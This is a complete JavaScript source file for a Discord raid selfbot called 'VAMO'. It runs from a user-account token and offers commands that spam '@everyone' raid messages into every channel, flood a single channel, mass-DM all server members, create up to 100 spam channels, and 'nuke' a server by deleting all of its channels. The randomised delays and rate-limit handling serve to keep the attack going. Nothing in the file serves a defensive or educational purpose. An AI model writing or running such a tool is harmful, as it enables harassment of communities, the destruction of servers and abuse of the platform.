const { Client } = require('discord.js-selfbot-v13');
const client = new Client();

const TOKEN = process.env.DISCORD_TOKEN;
const PREFIX = '!';

// Web server for Railway
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
    res.send('VAMO selfbot is running!');
});

app.listen(PORT, () => {
    console.log(`Web server running on port ${PORT}`);
});

client.on('ready', () => {
    console.log(`✅ Logged in as ${client.user.tag}`);
    console.log(`VAMO RAID SELFBOT READY`);
});

// Your exact raid message
const raidMessage = `@everyone @here **RAIDED BY VAMBO**

### NEVER SCAM AGAIN SON😂
            😯KICK ROCKS😯
https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`;

// Helper function for delay
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

client.on('messageCreate', async (message) => {
    if (message.author.id !== client.user.id) return;
    if (!message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // ===== SPAM ALL CHANNELS (100 MESSAGES EACH WITH 1-2s DELAYS) =====
    if (command === 'spamall') {
        const guild = message.guild;
        if (!guild) return;

        // Send activation message
        await message.channel.send('✅ VAMO ACTIVATED');
        
        // Get all text channels
        const channels = guild.channels.cache.filter(c => 
            c.type === 'GUILD_TEXT' && 
            c.permissionsFor(guild.members.me).has('SendMessages')
        );

        console.log(`🔥 SPAMALL: Spamming ${channels.size} channels with 100 messages each (1-2s delays)...`);

        let totalSent = 0;
        let totalFailed = 0;

        // Loop through each channel
        for (const [channelId, channel] of channels) {
            console.log(`\n📢 Spamming #${channel.name}...`);
            
            // Send 100 messages to this channel
            for (let i = 1; i <= 100; i++) {
                try {
                    await channel.send(raidMessage);
                    totalSent++;
                    
                    // Log progress every 10 messages
                    if (i % 10 === 0) {
                        console.log(`   ✅ ${i}/100 messages sent in #${channel.name}`);
                    }
                    
                    // Random delay between 1-2 seconds (1000-2000ms)
                    const waitTime = Math.floor(Math.random() * 1000) + 1000;
                    await delay(waitTime);
                    
                } catch (error) {
                    totalFailed++;
                    console.log(`   ❌ Failed message ${i} in #${channel.name}: ${error.message}`);
                    
                    // If rate limited, wait 5 seconds
                    if (error.message.includes('rate')) {
                        console.log('   ⏳ Rate limited, waiting 5 seconds...');
                        await delay(5000);
                    } else {
                        // If permission error, move to next channel
                        break;
                    }
                }
            }
            
            // 2 second delay between channels
            console.log(`   ✅ Completed #${channel.name}`);
            await delay(2000);
        }

        console.log('\n' + '='.repeat(50));
        console.log(`✅ SPAMALL COMPLETE: Sent ${totalSent} messages, Failed: ${totalFailed}`);
        console.log('='.repeat(50));
    }

    // ===== FLOOD CURRENT CHANNEL =====
    if (command === 'flood') {
        await message.channel.send('✅ VAMO ACTIVATED');
        
        const count = parseInt(args[0]) || 100;
        const channel = message.channel;

        console.log(`🔥 FLOOD: Sending ${count} messages to #${channel.name} with 1-2s delays...`);

        let sent = 0;
        let failed = 0;

        for (let i = 1; i <= count; i++) {
            try {
                await channel.send(raidMessage);
                sent++;
                
                if (i % 10 === 0) {
                    console.log(`   ✅ ${i}/${count} messages sent`);
                }
                
                // Random delay between 1-2 seconds
                await delay(Math.floor(Math.random() * 1000) + 1000);
                
            } catch (error) {
                failed++;
                console.log(`   ❌ Failed message ${i}: ${error.message}`);
                
                if (error.message.includes('rate')) {
                    console.log('   ⏳ Rate limited, waiting 5 seconds...');
                    await delay(5000);
                }
            }
        }

        console.log(`✅ FLOOD COMPLETE: Sent ${sent} messages, Failed: ${failed}`);
    }

    // ===== SPAM CHANNELS COMMAND (CREATE CHANNELS) =====
    if (command === 'spamchannels') {
        const guild = message.guild;
        if (!guild) return;

        await message.channel.send('✅ VAMO ACTIVATED');

        let channelCount = parseInt(args[0]) || 50;
        if (channelCount > 100) channelCount = 100;

        const channelName = 'R҉A҉I҉D҉ ҉B҉Y҉ ҉V҉A҉M҉B҉O҉';
        
        console.log(`🔥 Creating ${channelCount} channels with 1-2s delays...`);

        let created = 0;
        let failed = 0;

        for (let i = 1; i <= channelCount; i++) {
            try {
                const newChannel = await guild.channels.create(`${channelName}-${i}`, {
                    type: 'text'
                });
                await newChannel.send(raidMessage);
                created++;
                console.log(`✅ Created channel ${i}/${channelCount}`);
                
                // 1-2 second delay between channel creation
                await delay(Math.floor(Math.random() * 1000) + 1000);
                
            } catch (error) {
                failed++;
                console.log(`❌ Failed: ${error.message}`);
            }
        }

        console.log(`✅ Created ${created} channels, Failed: ${failed}`);
    }

    // ===== MASS DM COMMAND =====
    if (command === 'massdm') {
        const guild = message.guild;
        await message.channel.send('✅ VAMO ACTIVATED');

        console.log(`🔥 Mass DM to ${guild.memberCount} members with 1-2s delays...`);

        let sent = 0;
        let failed = 0;

        for (const member of guild.members.cache.values()) {
            if (member.user.bot || member.id === client.user.id) continue;

            try {
                await member.send(raidMessage);
                sent++;
                
                if (sent % 10 === 0) {
                    console.log(`✅ DMs sent: ${sent}`);
                }
                
                // 1-2 second delay between DMs
                await delay(Math.floor(Math.random() * 1000) + 1000);
                
            } catch (e) {
                failed++;
            }
        }

        console.log(`✅ MassDM complete: Sent to ${sent} members, Failed: ${failed}`);
    }

    // ===== NUKE COMMAND =====
    if (command === 'nuke') {
        const guild = message.guild;
        if (!guild) return;

        await message.channel.send('✅ VAMO ACTIVATED');

        // Delete all channels
        console.log('🔥 Deleting all channels with 1-2s delays...');
        let deleted = 0;
        
        for (const channel of guild.channels.cache.values()) {
            try {
                await channel.delete();
                deleted++;
                console.log(`✅ Deleted ${channel.name}`);
                await delay(Math.floor(Math.random() * 1000) + 1000);
            } catch (error) {
                console.log(`❌ Failed to delete: ${error.message}`);
            }
        }
        console.log(`✅ Deleted ${deleted} channels`);

        // Create 100 channels
        console.log('🔥 Creating 100 channels with 1-2s delays...');
        const channelName = 'R҉A҉I҉D҉ ҉B҉Y҉ ҉V҉A҉M҉B҉O҉';
        let created = 0;

        for (let i = 1; i <= 100; i++) {
            try {
                const newChannel = await guild.channels.create(`${channelName}-${i}`, {
                    type: 'text'
                });
                await newChannel.send(raidMessage);
                created++;
                console.log(`✅ Created channel ${i}/100`);
                await delay(Math.floor(Math.random() * 1000) + 1000);
            } catch (error) {
                console.log(`❌ Failed: ${error.message}`);
            }
        }

        console.log('✅ NUKE COMPLETE');
        console.log(`✅ Deleted: ${deleted} channels`);
        console.log(`✅ Created: ${created} channels`);
    }

    // ===== HELP COMMAND =====
    if (command === 'help') {
        await message.channel.send(`**🔥 VAMO RAID SELFBOT**

!spamall - 100 messages to EVERY channel (1-2s delays)
!flood [count] - Flood current channel (1-2s delays)
!spamchannels [num] - Create raid channels (1-2s delays)
!massdm - DM all members (1-2s delays)
!nuke - Delete all + create 100 channels (1-2s delays)
!help - Show this menu

✅ VAMO ACTIVATED`);
    }
});

client.login(TOKEN);
